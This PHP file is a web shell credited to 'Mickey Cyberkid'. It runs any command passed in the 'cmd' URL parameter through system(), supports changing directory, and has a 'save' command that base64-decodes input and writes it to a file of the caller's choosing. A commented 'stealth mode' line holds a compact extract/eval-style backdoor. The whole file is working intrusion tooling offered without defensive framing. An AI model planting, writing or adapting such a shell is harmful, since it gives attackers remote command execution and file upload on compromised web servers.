<?php
// Author : Mickey Cyberkid

echo "<pre>";
// Get Current Working Directory
$cwd = getcwd();
echo "[".$cwd.">";

//Stealth mode (*-*)
/*
extract($_REQUEST); @die($f($c));
*/

$cmd = $_GET['cmd'];

echo $cmd;
$com = explode(" ",$cmd);
if($com[0] === "cd"){
   echo $cmd;
   $com = explode(" ",$cmd);
   $dir = $com[1];
   chdir($dir);
   $cwd = getcwd();
   echo "[".$cwd.">";
  }
// Instantly save some data into file
else if($com[0] == "save"){
   // Base64 encoded data
   $enc_data = $com[1];
   // Output File Name
   $file_name = $com[2];
   //Initializing file 
   $file_save = fopen($file_name,'a');
   // Decoding Encoded Data 
   $decoded = base64_decode($enc_data);
   //Saving Data 
   fwrite($file_save,$decoded);
   fclose($file_save);
  }

else{
   // Run Shell Command
   echo system($cmd);
  }
?>
